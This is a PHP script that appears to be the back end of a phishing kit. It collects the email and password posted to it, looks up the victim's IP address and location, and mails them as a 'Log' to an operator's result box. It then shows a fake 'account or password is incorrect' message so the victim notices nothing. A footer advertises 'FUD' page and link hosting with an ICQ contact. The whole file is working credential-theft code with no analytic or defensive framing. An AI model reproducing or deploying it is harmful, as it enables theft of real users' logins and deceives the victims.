<?php header('Access-Control-Allow-Origin: *');
include("resultbox.php");
require_once('geoplugin.class.php');

	if($_POST){

	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
	    $ip = $_SERVER['HTTP_CLIENT_IP']; 
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} else { 
	    $ip = $_SERVER['REMOTE_ADDR']; 
	} 

		
	/* Gathering Data Variables */

	$email = $_POST['email'];
	$pass = $_POST['password'];
	$subject = "Log From: $email | $name";


		$body = "
	Email Address: <strong>$email</strong><br>
	Login Password: <strong>$pass</strong><br>
	IP Address: <strong>$ip<strong> / City: {$geoplugin->city} / Region: {$geoplugin->region} / Country: {$geoplugin->countryName}
<br><br>
	<center style='text-align: center;'>
	<i>
	.:\FUD Page and Link Hosting/:. <br>
	ICQ ID: 741006587
	</i>
	</center>
	";

	$headers = "From: Noreply\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

	$success = sendEmail($to, $subject, $body, $headers);
	// $success2 = mail($resultBox2, $subject, $body, $headers);

	$arr = $arrayName = array('signal' => 'ok', 'msg'=>'Your account or password is incorrect. If you don\'t remember your password, <a href="#">reset it now.</a>' );

	echo json_encode($arr)	;	
}	



exit();
  

?>